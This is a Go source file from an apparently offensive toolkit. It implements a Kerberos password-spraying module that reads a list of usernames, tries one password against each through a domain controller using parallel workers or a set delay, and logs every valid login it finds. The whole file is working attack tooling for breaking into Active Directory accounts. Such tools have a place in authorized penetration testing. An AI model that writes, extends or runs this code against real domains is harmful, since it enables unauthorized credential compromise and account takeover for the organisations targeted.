package remote_exploit

import (
	"bufio"
	"context"
	"divine-dragon/transport"
	"divine-dragon/util"
	"fmt"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type KerberosSprayingModule struct {
	domain       string
	dc           string
	verbose      bool
	safemode     bool
	downgrade    bool
	usernamelist string
	password     string

	kSession transport.KerberosSession
	kOptions transport.KerberosSessionOptions

	ctx       context.Context
	cancel    context.CancelFunc
	threads   int
	delay     int
	counter   int32
	successes int32

	logger util.Logger
}

func NewKerberosSprayingModule(domainOpt string, dcOpt string, verboseOpt bool, safemodeOpt bool,
	downgradeOpt bool, usernamelistOpt string, passwordOpt string,
	logFileName string, threadsOpt int, delayOpt int) *KerberosSprayingModule {
	ksm := KerberosSprayingModule{domain: domainOpt,
		dc:           dcOpt,
		verbose:      verboseOpt,
		safemode:     safemodeOpt,
		downgrade:    downgradeOpt,
		usernamelist: usernamelistOpt,
		password:     passwordOpt}
	ksm.ctx, ksm.cancel = context.WithCancel(context.Background())
	ksm.logger = util.KerberosSprayLogger(verboseOpt, logFileName)
	ksm.delay = delayOpt
	if delayOpt != 0 {
		ksm.threads = 1
		ksm.logger.Log.Infof("Delay set. Using single thread and delaying %dms between attempts\n", ksm.delay)
	} else {
		ksm.threads = threadsOpt
	}
	ksm.setupSession()
	return &ksm
}

func (ksm *KerberosSprayingModule) setupSession() {
	ksm.kOptions = transport.KerberosSessionOptions{
		Domain:           ksm.domain,
		DomainController: ksm.dc,
		Verbose:          ksm.verbose,
		SafeMode:         ksm.safemode,
		Downgrade:        ksm.downgrade,
	}
	k, err := transport.NewKerberosSession(ksm.kOptions)
	if err != nil {
		ksm.logger.Log.Error(err)
	}
	ksm.kSession = k

	ksm.logger.Log.Info("Using KDC(s):")
	for _, v := range ksm.kSession.Kdcs {
		ksm.logger.Log.Infof("\t%s\n", v)
	}
}

func (ksm *KerberosSprayingModule) Run() {
	usersChan := make(chan string, ksm.threads)
	defer ksm.cancel()

	var wg sync.WaitGroup
	wg.Add(ksm.threads)

	var scanner *bufio.Scanner
	if ksm.usernamelist != "-" {
		file, err := os.Open(ksm.usernamelist)
		if err != nil {
			ksm.logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	for i := 0; i < ksm.threads; i++ {
		go ksm.makeSprayWorker(ksm.ctx, usersChan, &wg, ksm.password)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ksm.ctx.Done():
			break Scan
		default:
			usernameline := scanner.Text()
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				ksm.logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				continue
			}
			time.Sleep(time.Duration(ksm.delay) * time.Millisecond)
			usersChan <- username
		}
	}
	close(usersChan)
	wg.Wait()

	finalCount := atomic.LoadInt32(&ksm.counter)
	finalSuccess := atomic.LoadInt32(&ksm.successes)
	ksm.logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		ksm.logger.Log.Error(err.Error())
	}
}

func (ksm *KerberosSprayingModule) makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			break
		case username, ok := <-usernames:
			if !ok {
				return
			}
			ksm.doOneLogin(ctx, username, password)
		}
	}
}

func (ksm *KerberosSprayingModule) doOneLogin(ctx context.Context, username string, password string) {
	atomic.AddInt32(&ksm.counter, 1)
	login := fmt.Sprintf("%v@%v:%v", username, ksm.domain, password)
	if ok, err := ksm.kSession.TestLogin(username, password); ok {
		atomic.AddInt32(&ksm.successes, 1)
		if err != nil { // it's a valid login, but there's an error we should display
			ksm.logger.Log.Noticef("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)", login, err)
		} else {
			ksm.logger.Log.Noticef("[+] VALID LOGIN:\t %s", login)
		}
		// if kms.stopOnSuccess {
		// 	ksm.cancel()
		// }
	} else {
		// This is to determine if the error is "okay" or if we should abort everything
		ok, errorString := ksm.kSession.HandleKerbError(err)
		if !ok {
			ksm.logger.Log.Errorf("[!] %v - %v", login, errorString)
			ksm.cancel()
		} else {
			ksm.logger.Log.Debugf("[!] %v - %v", login, errorString)
		}
	}
}
